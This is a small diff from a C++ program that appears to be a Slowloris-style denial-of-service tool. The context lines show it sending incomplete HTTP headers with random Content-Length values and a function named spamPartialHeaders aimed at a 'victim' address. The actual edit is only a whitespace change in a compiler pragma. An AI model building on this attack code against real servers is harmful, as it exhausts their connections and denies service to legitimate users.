@@ -36,7 +36,7 @@ void initialSendSocket(int socketNum)
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
 	sprintf(incompleteHeader, "Content-Length: %d\r\n", (rand() % 99999 + 1000));
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
-#pragma warning(default: 4996) //Restore warnings back to usual as we don't want to miss any other possible 4496's.
+#pragma warning(default:4996) //Restore warnings back to usual as we don't want to miss any other possible 4496's.
 }
 
 void spamPartialHeaders(struct sockaddr_in victim, std::vector<int> socketList, int totalSockets)
